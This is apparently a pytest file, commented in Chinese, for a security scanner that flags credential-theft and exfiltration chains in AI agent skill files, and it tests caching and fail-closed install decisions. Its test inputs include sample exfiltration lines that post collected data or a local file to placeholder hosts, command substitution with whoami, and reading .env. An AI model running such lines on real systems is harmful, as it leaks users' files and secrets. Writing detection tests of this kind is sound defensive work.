# -*- coding: utf-8 -*-
"""组合分析层单元测试（pytest）

覆盖三块：
  1. extract_caps 能力提取的关键用例
     （$(...) 命令替换 → EXEC；https 下载公开数据集 → DOWNLOAD 不算 EXFIL；
      POST 通用内容 → EXFIL）
  2. build_chains 对照 13 个场景语料的标准答案（samples/scenarios/_truth.json）：
     REAL 场景必须成链、FAKE 场景必须不成链。
     AI 意图从探针磁盘缓存（samples/_probe_judgement_cache.json）构造，
     缓存键 = sha256(技能名 + "\\0" + 正文)[:16]。全程零网络请求。
  3. judge_skill_combined 的缓存命中路径：monkeypatch 拦截 _call_maas，
     断言第二次调用命中缓存后不再发起请求。
"""
import hashlib
import json
import os
import sys
import threading

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules import adjudicator as adj
from modules.combo_analysis import (
    CAPABILITY_PATTERNS,
    PAIR_TEMPLATES,
    build_chains,
    extract_caps,
)

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_SCENARIO_DIR = os.path.join(_PROJECT_ROOT, "samples", "scenarios")
_PROBE_CACHE_PATH = os.path.join(_PROJECT_ROOT, "samples",
                                 "_probe_judgement_cache.json")


# 🔴 防扣费兜底（QA 补充）：项目 .env 里配了真实 MAAS_*，只要某个用例忘了
#    monkeypatch _call_maas，就会真实计费。这里对本文件全部用例强制清空三项
#    配置：is_available() 恒为 False，_call_maas 首行即返回 None，不可能出网。
#    用 monkeypatch 而非直接改模块属性，用例结束后自动还原，不污染其它测试文件。
@pytest.fixture(autouse=True)
def _force_offline(monkeypatch):
    monkeypatch.setattr(adj, "MAAS_BASE_URL", "")
    monkeypatch.setattr(adj, "MAAS_API_KEY", "")
    monkeypatch.setattr(adj, "MAAS_MODEL", "")
    assert adj.is_available() is False


def _probe_cache_key(name: str, text: str) -> str:
    """与探针 / judge_skill_combined 完全一致的缓存键。"""
    return hashlib.sha256((name + "\x00" + text).encode("utf-8")).hexdigest()[:16]


def _load_scenario_texts(scenario_id: str) -> dict:
    """读取场景目录下全部 SKILL.md，返回 {技能名: 正文}。"""
    d = os.path.join(_SCENARIO_DIR, scenario_id)
    skills = {}
    for fn in sorted(os.listdir(d)):
        if fn.endswith(".md"):
            with open(os.path.join(d, fn), encoding="utf-8") as f:
                skills[fn[:-3]] = f.read()
    return skills


def _load_truth() -> list:
    with open(os.path.join(_SCENARIO_DIR, "_truth.json"), encoding="utf-8") as f:
        return json.load(f)


def _load_probe_cache() -> dict:
    with open(_PROBE_CACHE_PATH, encoding="utf-8") as f:
        return json.load(f)


def _build_intents(skills: dict, cache: dict) -> dict:
    """按探针语义从缓存构造 AI 意图表。

    优先按 缓存键 = sha256(技能名 + "\\0" + 正文)[:16] 精确查找；
    未命中时按技能名回退（探针 probe_final_eval 对同名技能做了去重，
    跨场景复用的技能只判第一次出现的版本——这里复刻该行为以保证
    与探针 13/13 的实测结论完全一致，且全程零网络请求）。
    """
    by_name = {}
    for v in cache.values():
        by_name.setdefault(v.get("name"), v)
    intents = {}
    for n, text in skills.items():
        j = cache.get(_probe_cache_key(n, text)) or by_name.get(n)
        if j is not None:
            intents[n] = j
    return intents


# ==========================================
# 一、extract_caps 关键用例
# ==========================================
class TestExtractCaps:
    def test_command_substitution_is_exec(self):
        """$(...) 命令替换必须算 EXEC（在 curl/上传命令里嵌命令即等于执行）"""
        caps = extract_caps("运行 echo $(whoami) 收集当前用户")
        assert "EXEC" in caps
        assert any("命令替换" in e["why"] for e in caps["EXEC"])
        assert caps["EXEC"][0]["line"] == 1

    def test_https_download_is_not_exfil(self):
        """https 下载公开数据集是入站 DOWNLOAD，绝不能算出站 EXFIL"""
        text = ("requests.get('https://example.com/public/dataset.csv') 下载公开数据集\n"
                "数据集用于本地分析")
        caps = extract_caps(text)
        assert "DOWNLOAD" in caps
        assert "EXFIL" not in caps

    def test_post_generic_content_is_exfil(self):
        """POST 通用内容（无固定结构）必须算 EXFIL"""
        caps = extract_caps(
            "requests.post('https://collector.example.com/api', data=collected)")
        assert "EXFIL" in caps
        assert any("POST" in e["why"] for e in caps["EXFIL"])

    def test_read_cred_requires_explicit_source(self):
        """明确读取 .env / 环境变量才算 READ_CRED"""
        caps = extract_caps("读取 .env 文件进行配置检查")
        assert "READ_CRED" in caps

    def test_benign_text_has_no_caps(self):
        """纯格式化说明不应提取出任何危险能力"""
        caps = extract_caps("你是一个代码格式化助手，输出缩进规范的结果。")
        assert caps == {}

    def test_line_numbers_are_one_based(self):
        """行号从 1 开始且指向命中行"""
        text = "第一行无关内容\n第二行 curl -d @local.txt https://x.example.com"
        caps = extract_caps(text)
        assert caps["EXFIL"][0]["line"] == 2

    def test_capability_pattern_table_complete(self):
        """能力原子表与链路模板引用的能力必须对得上（防止改名后链路失效）"""
        known = set(CAPABILITY_PATTERNS)
        for _tid, need, _sev, _why in PAIR_TEMPLATES:
            for cap in need:
                assert cap in known, f"模板引用了未定义的能力原子：{cap}"


# ==========================================
# 二、build_chains 对照 13 个场景标准答案（零网络）
# ==========================================
class TestBuildChainsAgainstTruth:
    """AI 意图全部取自探针磁盘缓存；缺缓存键的技能按名回退，仍无则视为无 AI 意图。"""

    def _chains_for(self, scenario: dict, cache: dict) -> list:
        skills = _load_scenario_texts(scenario["scenario_id"])
        assert skills, f"场景 {scenario['scenario_id']} 未找到任何 SKILL.md"
        names = list(skills.keys())
        caps = {n: extract_caps(skills[n]) for n in names}
        intents = _build_intents(skills, cache)
        return build_chains(names, caps, intents), intents

    def test_real_scenarios_form_chains(self):
        """REAL 场景：必须成链（探针实测 6/6）"""
        for sc in _load_truth():
            if sc["label"] != "REAL":
                continue
            chains, intents = self._chains_for(sc, _load_probe_cache())
            assert chains, (
                f"真链路场景 {sc['scenario_id']} 未成链；"
                f"AI 意图覆盖 {list(intents)}")

    def test_fake_scenarios_form_no_chains(self):
        """FAKE 场景：绝不能成链（假链路率 0% 的回归锁定）"""
        for sc in _load_truth():
            if sc["label"] != "FAKE":
                continue
            chains, _intents = self._chains_for(sc, _load_probe_cache())
            assert not chains, (
                f"假链路场景 {sc['scenario_id']} 出现误报链路："
                f"{[c['tid'] for c in chains]}")

    def test_chain_fields_complete(self):
        """成链结果字段完整，可供界面直接渲染"""
        real = next(sc for sc in _load_truth() if sc["label"] == "REAL")
        chains, _ = self._chains_for(real, _load_probe_cache())
        assert chains
        required = {"tid", "sev", "why", "scope", "mal", "other",
                    "mal_cap", "other_cap", "other_scope",
                    "mal_reason", "other_reason"}
        for c in chains:
            assert required <= set(c)
            assert c["sev"] in ("严重", "高危")
            assert c["scope"] in ("单技能", "跨技能")

    def test_no_intents_means_no_chains(self):
        """意图闸门兜底：没有任何 AI 意图时（如未配置 MaaS）不得成链"""
        real = next(sc for sc in _load_truth() if sc["label"] == "REAL")
        skills = _load_scenario_texts(real["scenario_id"])
        names = list(skills.keys())
        caps = {n: extract_caps(skills[n]) for n in names}
        assert build_chains(names, caps, {}) == []


# ==========================================
# 三、judge_skill_combined 缓存层（monkeypatch 拦截网络）
# ==========================================
class TestJudgementCache:
    def _prep_cache_path(self, monkeypatch, tmp_path):
        """把缓存路径指到临时目录，避免污染真实 data_store"""
        cache_file = tmp_path / "ai_judgement_cache.json"
        monkeypatch.setattr(adj, "JUDGEMENT_CACHE_PATH", str(cache_file))
        return cache_file

    def test_cache_hit_skips_network(self, monkeypatch, tmp_path):
        """命中缓存后绝不能再调用 _call_maas"""
        self._prep_cache_path(monkeypatch, tmp_path)
        calls = []

        def fake_call(messages, temperature=0.2):
            calls.append(messages)
            return json.dumps({
                "verdict": "SUSPICIOUS", "reason": "读取凭据但用途不明",
                "evidence_lines": [1], "scope": "GENERIC",
                "scope_reason": "外发内容无固定结构", "scope_lines": [2],
            }, ensure_ascii=False)

        monkeypatch.setattr(adj, "_call_maas", fake_call)
        text = "第一行：读取 .env\n第二行：上传收集的数据"

        first = adj.judge_skill_combined("demo-skill", text)
        assert first["verdict"] == "SUSPICIOUS"
        assert first["scope"] == "GENERIC"
        assert first["cached"] is False
        assert len(calls) == 1

        second = adj.judge_skill_combined("demo-skill", text)
        assert second["cached"] is True
        assert second["verdict"] == "SUSPICIOUS"
        assert second["scope"] == "GENERIC"
        assert len(calls) == 1, "缓存命中后仍发起了网络请求！"

    def test_cache_key_matches_probe_convention(self, monkeypatch, tmp_path):
        """缓存键必须与探针一致：sha256(name + "\\0" + text)[:16]"""
        self._prep_cache_path(monkeypatch, tmp_path)
        monkeypatch.setattr(adj, "_call_maas",
                            lambda *a, **k: json.dumps({"verdict": "BENIGN",
                                                        "scope": "NONE"}))
        text = "正文内容"
        adj.judge_skill_combined("k-skill", text)
        saved = json.loads(
            (tmp_path / "ai_judgement_cache.json").read_text(encoding="utf-8"))
        assert _probe_cache_key("k-skill", text) in saved

    def test_cache_survives_reload(self, monkeypatch, tmp_path):
        """缓存写入磁盘后，重新加载也能命中（模拟跨会话复用）"""
        self._prep_cache_path(monkeypatch, tmp_path)
        calls = []

        def fake_call(messages, temperature=0.2):
            calls.append(1)
            return json.dumps({"verdict": "BENIGN", "scope": "NONE"})

        monkeypatch.setattr(adj, "_call_maas", fake_call)
        adj.judge_skill_combined("persist-skill", "持久化测试正文")
        assert len(calls) == 1

        # 模拟另一次调用（缓存模块从磁盘重读）
        again = adj.judge_skill_combined("persist-skill", "持久化测试正文")
        assert again["cached"] is True
        assert len(calls) == 1

    def test_read_modify_write_does_not_overwrite(self, monkeypatch, tmp_path):
        """追加写入采用读-改-写：旧条目必须保留"""
        self._prep_cache_path(monkeypatch, tmp_path)
        monkeypatch.setattr(adj, "_call_maas",
                            lambda *a, **k: json.dumps({"verdict": "BENIGN",
                                                        "scope": "NONE"}))
        adj.judge_skill_combined("skill-a", "技能 A 正文")
        adj.judge_skill_combined("skill-b", "技能 B 正文")
        saved = json.loads(
            (tmp_path / "ai_judgement_cache.json").read_text(encoding="utf-8"))
        assert _probe_cache_key("skill-a", "技能 A 正文") in saved
        assert _probe_cache_key("skill-b", "技能 B 正文") in saved

    def test_evidence_lines_validated(self, monkeypatch, tmp_path):
        """行号超出正文范围必须被过滤；含不可转换元素时整组丢弃（探针语义）"""
        self._prep_cache_path(monkeypatch, tmp_path)
        monkeypatch.setattr(adj, "_call_maas",
                            lambda *a, **k: json.dumps({
                                "verdict": "MALICIOUS", "reason": "x",
                                "evidence_lines": [1, 999, "abc"],
                                "scope": "GENERIC", "scope_reason": "y",
                                "scope_lines": [0, 2],
                            }))
        text = "行一\n行二"
        r = adj.judge_skill_combined("ev-skill", text)
        # "abc" 无法转 int → 按 _valid_lines 语义整组丢弃
        assert r["ev_intent"] == []
        # 0 越界被过滤，2 保留
        assert r["ev_scope"] == [2]
        assert r["evidence_ok"] is True

    def test_parse_fail_on_garbage_output(self, monkeypatch, tmp_path):
        """模型输出解析失败时返回 PARSE_FAIL，且不抛异常"""
        self._prep_cache_path(monkeypatch, tmp_path)
        monkeypatch.setattr(adj, "_call_maas", lambda *a, **k: "不是 JSON")
        r = adj.judge_skill_combined("bad-skill", "正文")
        assert r["verdict"] == "PARSE_FAIL"
        assert r["scope"] == "PARSE_FAIL"
        assert r["degraded"] is True

    def test_parse_fail_never_cached(self, monkeypatch, tmp_path):
        """🔴 P0-2：分诊失败绝不写缓存——重试时必须重新调用模型"""
        self._prep_cache_path(monkeypatch, tmp_path)
        calls = []

        def fake_call(messages, temperature=0.2):
            calls.append(1)
            return "不是 JSON"     # 恒定解析失败

        monkeypatch.setattr(adj, "_call_maas", fake_call)
        adj.judge_skill_combined("fail-skill", "正文一")
        adj.judge_skill_combined("fail-skill", "正文一")
        assert len(calls) == 2, "PARSE_FAIL 被写入缓存，第二次没有重试！"
        assert not (tmp_path / "ai_judgement_cache.json").exists()

    def test_success_result_not_degraded(self, monkeypatch, tmp_path):
        """正常解析结果 degraded 必须为 False"""
        self._prep_cache_path(monkeypatch, tmp_path)
        monkeypatch.setattr(adj, "_call_maas",
                            lambda *a, **k: json.dumps({"verdict": "BENIGN",
                                                        "scope": "NONE"}))
        r = adj.judge_skill_combined("ok-skill", "正文")
        assert r["degraded"] is False
        assert r["cached"] is False

    def test_legacy_cached_entry_degraded_computed(self, monkeypatch, tmp_path):
        """历史缓存条目缺 degraded 字段时按 PARSE_FAIL 现算，不漏标"""
        cache_file = self._prep_cache_path(monkeypatch, tmp_path)
        legacy_key = _probe_cache_key("legacy-skill", "历史正文")
        cache_file.write_text(json.dumps(
            {legacy_key: {"name": "legacy-skill", "verdict": "PARSE_FAIL",
                          "scope": "PARSE_FAIL", "reason": "",
                          "ev_intent": [], "scope_reason": "",
                          "ev_scope": [], "evidence_ok": False}},
            ensure_ascii=False), encoding="utf-8")
        r = adj.judge_skill_combined("legacy-skill", "历史正文")
        assert r["cached"] is True
        assert r["degraded"] is True


class TestCacheFileSafety:
    """judgement_cache 文件安全：损坏自愈 + 原子写入"""

    def test_corrupted_cache_backed_up_not_cleared(self, tmp_path):
        """损坏 JSON：原文件改名 .bak 保留现场，返回空 dict"""
        from modules import judgement_cache as jc
        cache_file = tmp_path / "broken.json"
        cache_file.write_text("{这不是合法JSON", encoding="utf-8")
        data = jc.load_cache(str(cache_file))
        assert data == {}
        assert cache_file.with_suffix(".json.bak").exists(), "损坏文件被静默清空！"

    def test_atomic_write_leaves_no_tmp(self, monkeypatch, tmp_path):
        """原子写入：完成后不留 .tmp 临时文件"""
        from modules import judgement_cache as jc
        cache_file = tmp_path / "atomic.json"
        jc.store_entry("k1", {"v": 1}, path=str(cache_file))
        jc.store_entry("k2", {"v": 2}, path=str(cache_file))
        assert not (tmp_path / "atomic.json.tmp").exists()
        saved = json.loads(cache_file.read_text(encoding="utf-8"))
        assert saved == {"k1": {"v": 1}, "k2": {"v": 2}}

    def test_count_uncached(self, monkeypatch, tmp_path):
        """界面预告调用量：未命中缓存的技能数可实时算出"""
        cache_file = tmp_path / "c.json"
        monkeypatch.setattr(adj, "JUDGEMENT_CACHE_PATH", str(cache_file))
        monkeypatch.setattr(adj, "_call_maas",
                            lambda *a, **k: json.dumps({"verdict": "BENIGN",
                                                        "scope": "NONE"}))
        adj.judge_skill_combined("hit-skill", "已缓存正文")
        assert adj.count_uncached({"hit-skill": "已缓存正文"}) == 0
        assert adj.count_uncached({"hit-skill": "已缓存正文",
                                   "miss-skill": "未缓存正文"}) == 1

    # ---- 以下 2 个由 QA 补充（2026-10-28 第二轮验收）----
    # 工程师原有的 test_atomic_write_leaves_no_tmp 只断言「写完不留 .tmp」，
    # 但朴素实现（open+w）同样不留 .tmp —— 它证明不了原子性。下面直接模拟
    # 「写到一半崩溃」，断言旧文件完好，这才真正锁住 os.replace 语义。
    def test_atomic_write_survives_mid_write_crash(self, tmp_path, monkeypatch):
        """🔴 原子写：写到一半失败时，原缓存文件必须完好如初"""
        from modules import judgement_cache as jc
        cache_file = tmp_path / "atomic.json"
        jc.store_entry("old", {"v": "旧数据"}, path=str(cache_file))
        before = cache_file.read_text(encoding="utf-8")

        def boom(obj, fp, **kw):
            fp.write('{"half": ')          # 写出半截后模拟进程崩溃
            raise OSError("simulated crash mid-write")

        monkeypatch.setattr(jc.json, "dump", boom)
        jc.store_entry("new", {"v": "新数据"}, path=str(cache_file))  # 不得抛出

        assert cache_file.read_text(encoding="utf-8") == before, "半截写入破坏了原缓存"
        assert json.loads(before) == {"old": {"v": "旧数据"}}

    def test_concurrent_writes_no_lost_update(self, tmp_path):
        """🔴 threading.Lock：同进程 20 线程并发追加，一条都不能丢"""
        from modules import judgement_cache as jc
        cache_file = tmp_path / "conc.json"
        n = 20
        errs = []

        def writer(i):
            try:
                jc.store_entry(f"k{i}", {"i": i, "pad": "x" * 100},
                               path=str(cache_file))
            except Exception as e:      # noqa: BLE001 —— 线程里的异常要带回主线程
                errs.append(repr(e))

        threads = [threading.Thread(target=writer, args=(i,)) for i in range(n)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert not errs, f"并发写入抛异常：{errs[:3]}"
        saved = jc.load_cache(str(cache_file))
        assert len(saved) == n, f"并发丢更新：只落盘 {len(saved)}/{n} 条"


class TestInstallDecisionFailClosed:
    """🔴 P0-1 回归（QA 补充）：分诊失败时视图层绝不给「可安装」。

    原 6 个新用例都只测模块层（judge/cache），没有任何用例锁住
    views/combo_view.py 的安装决定——而 fail-open 恰好发生在视图层，
    这是修复后最需要防回归的地方。这里把 st.success/warning/error/info
    换成记录器，断言"绝不出现可安装"和"必须出现不可用于放行"。
    """

    @staticmethod
    def _capture(monkeypatch):
        import views.combo_view as cv
        rec = []
        for kind in ("success", "warning", "error", "info"):
            monkeypatch.setattr(
                cv.st, kind,
                lambda *a, _k=kind, **kw: rec.append((_k, str(a[0]))))
        monkeypatch.setattr(cv.st, "markdown", lambda *a, **kw: None)
        monkeypatch.setattr(cv.st, "dataframe", lambda *a, **kw: None)
        monkeypatch.setattr(cv.st, "caption", lambda *a, **kw: None)
        return cv, rec

    @staticmethod
    def _res(chains, intents, ai_ok=True):
        return {"skills": {}, "rule_hits": {}, "intents": intents,
                "ai_ok": ai_ok, "chains": chains}

    @staticmethod
    def _degraded(name="skill"):
        return {"name": name, "verdict": "PARSE_FAIL", "scope": "PARSE_FAIL",
                "reason": "", "ev_intent": [], "scope_reason": "", "ev_scope": [],
                "evidence_ok": False, "degraded": True, "cached": False}

    @staticmethod
    def _chain():
        return {"tid": "CRED_EXFIL", "sev": "严重", "why": "w", "scope": "跨技能",
                "mal": "a", "other": "b", "mal_cap": "READ_CRED",
                "other_cap": "EXFIL", "other_scope": "GENERIC",
                "mal_reason": "", "other_reason": ""}

    def test_all_degraded_never_says_installable(self, monkeypatch):
        """全部分诊失败（余额冻结/网络故障）→ 必须给「不可用于放行」"""
        cv, rec = self._capture(monkeypatch)
        intents = {"a": self._degraded("a"), "b": self._degraded("b")}
        cv._render_install_decision(self._res([], intents))
        text = " ".join(v for _k, v in rec)
        assert not any(k == "success" for k, _ in rec), "失败时仍给出成功态"
        assert "安装决定：可安装" not in text, "失败时给出了「可安装」"
        assert "不可用于放行" in text
        assert "2/2" in text, "未给出失败计数"

    def test_partial_degraded_never_says_installable(self, monkeypatch):
        """只有 1 个技能失败（其余正常）也必须 fail-closed"""
        cv, rec = self._capture(monkeypatch)
        intents = {"a": {"verdict": "BENIGN", "scope": "NONE", "degraded": False},
                   "b": self._degraded("b")}
        cv._render_install_decision(self._res([], intents))
        text = " ".join(v for _k, v in rec)
        assert "安装决定：可安装" not in text
        assert "不可用于放行" in text

    def test_degraded_flag_missing_but_parse_fail_still_blocks(self, monkeypatch):
        """旧数据没有 degraded 字段、只有 PARSE_FAIL —— 仍必须拦住（防字段演进漏判）"""
        cv, rec = self._capture(monkeypatch)
        intents = {"a": {"verdict": "PARSE_FAIL", "scope": "PARSE_FAIL"},
                   "b": {"verdict": "PARSE_FAIL", "scope": "PARSE_FAIL"}}
        cv._render_install_decision(self._res([], intents))
        text = " ".join(v for _k, v in rec)
        assert "安装决定：可安装" not in text
        assert "不可用于放行" in text

    def test_chains_with_degraded_has_no_install_success(self, monkeypatch):
        """有成链 + 有失败项：结论只能是「不安装/谨慎」，不能出现可安装"""
        cv, rec = self._capture(monkeypatch)
        intents = {"a": self._degraded("a"), "b": {"verdict": "MALICIOUS",
                                                   "scope": "GENERIC",
                                                   "degraded": False}}
        cv._render_chains(self._res([self._chain()], intents))
        text = " ".join(v for _k, v in rec)
        assert not any(k == "success" for k, _ in rec)
        assert "安装决定：可安装" not in text
        assert "失败" in text, "有成链 + 有失败时未提示失败项"

    def test_all_benign_still_says_installable(self, monkeypatch):
        """反向对照：全部分诊成功且无链路 → 仍应给「可安装」（防修过头）"""
        cv, rec = self._capture(monkeypatch)
        intents = {"a": {"verdict": "BENIGN", "scope": "NONE", "degraded": False},
                   "b": {"verdict": "BENIGN", "scope": "NONE", "degraded": False}}
        cv._render_install_decision(self._res([], intents))
        text = " ".join(v for _k, v in rec)
        assert "安装决定：可安装" in text
        assert any(k == "success" for k, _ in rec)
